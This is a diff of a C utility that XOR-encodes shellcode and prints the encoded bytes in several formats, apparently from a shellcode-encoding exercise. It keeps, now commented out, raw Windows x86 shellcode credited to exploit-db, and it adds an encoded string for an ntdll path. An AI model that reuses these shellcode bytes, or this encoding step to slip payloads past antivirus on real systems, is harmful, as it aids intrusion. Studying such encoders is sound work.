@@ -2,10 +2,13 @@
 #include <stdlib.h>
 #include <string.h>
 
-#define XORVAL 0x0e // the value that will be used to xor with every byte
+#define XORVAL 0x3a // the value that will be used to xor with every byte
 
 /* https://www.exploit-db.com/shellcodes/50291 */
 unsigned char shellcode[] = \
+"\x59\x00\x66\x4d\x53\x54\x5e\x55\x4d\x49\x66\x49\x43\x49\x4e\x5f\x57\x9\x8\x66\x54\x4e\x5e\x56\x56\x14\x5e\x56\x56\x3a";
+
+/*	      
 "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b"
 "\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31"
 "\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f"
@@ -30,7 +33,7 @@ unsigned char shellcode[] = \
 "\x57\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52"
 "\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50"
 "\x52\x52\x51\x52\xff\xd5";
-
+*/
 
 void main(int argc, char * argv[])
 {
@@ -52,7 +55,7 @@ printf("\033[0m");
 
 	printf("\033[01;33m");
 	printf("\n");
-	printf("\n[-] Original Shellcode:");
+	printf("\n[*] Original Shellcode:");
 	printf("\n\n\n");
 	printf("\033[0m");
 
@@ -75,12 +78,30 @@ printf("\033[0m");
 	printf("\033[0m");
 
 	for (int o=0; o<sizeof(shellcode)-1; o++) {
-				printf("\033[0;36m");
+		printf("\033[0;36m");
+                printf("0x%02x,", shellcode[o]);
+                printf("\033[0m");
+        }
+
+	printf("\033[0;32m");
+	printf("\n\n----------------------\n\n");
+	printf("\033[0m");
+
+
+	for (int o=0; o<sizeof(shellcode)-1; o++) {
+		printf("\033[0;36m");
                 printf("%02x", shellcode[o]);
                 printf("\033[0m");
         }
+
+        printf("\033[0;32m");
+	printf("\n\n**********************");
+	printf("**********************");
+	printf("\033[0m");
+
+
         printf("\033[01;33m");
-	printf("\n\n[-] Original Shellcode Length : %d\n",sizeof(shellcode)-1);
+	printf("\n\n[*] Original Shellcode Length : %d\n",sizeof(shellcode)-1);
 	printf("\033[0m");
 
 	for (int i=0; i<(sizeof(shellcode)*2); i++) {
@@ -95,14 +116,14 @@ printf("\033[0m");
 	printf("\033[0m");
 
         printf("\033[01;33m");
-	printf("\n\n[-] Encoded Shellcode:\n\n");
+	printf("\n\n[*] Encoded Shellcode:\n\n");
 	printf("\033[0m");
 
 	for (int i=0; i<sizeof(shellcode)-1; i++) {
-		shellcode1[i] = shellcode1[i] ^ XORVAL; 
+		shellcode2[i] = shellcode2[i] ^ XORVAL; //shellcode2[sizeof(shellcode)-1];
 		printf("\033[01;34m");
-		printf("0x%02x,", shellcode1[i]);
-		printf("\033[0m");
+        	printf("\\x%02x", shellcode2[i]);
+        	printf("\033[0m");
 	}
 
 	printf("\n\n");
@@ -111,10 +132,10 @@ printf("\033[0m");
 	printf("\033[0m");
 
  	for (int i=0; i<sizeof(shellcode)-1; i++) {
-		shellcode2[i] = shellcode2[i] ^ XORVAL;
+		shellcode1[i] = shellcode1[i] ^ XORVAL; 
 		printf("\033[01;34m");
-        	printf("\\x%02x", shellcode2[i]);
-        	printf("\033[0m");
+		printf("0x%02x,", shellcode1[i]);
+		printf("\033[0m");
 	}
 
         printf("\n\n");
@@ -123,7 +144,7 @@ printf("\033[0m");
         printf("\033[0m");
 
         for (int i=0; i<sizeof(shellcode)-1; i++) {
-                shellcode3[i] = shellcode3[i] ^ XORVAL;
+                shellcode3[i] = shellcode3[i] ^ XORVAL; //shellcode3[sizeof(shellcode)-1];
                 printf("\033[01;34m");
                 printf("%02x", shellcode3[i]);
                 printf("\033[0m");
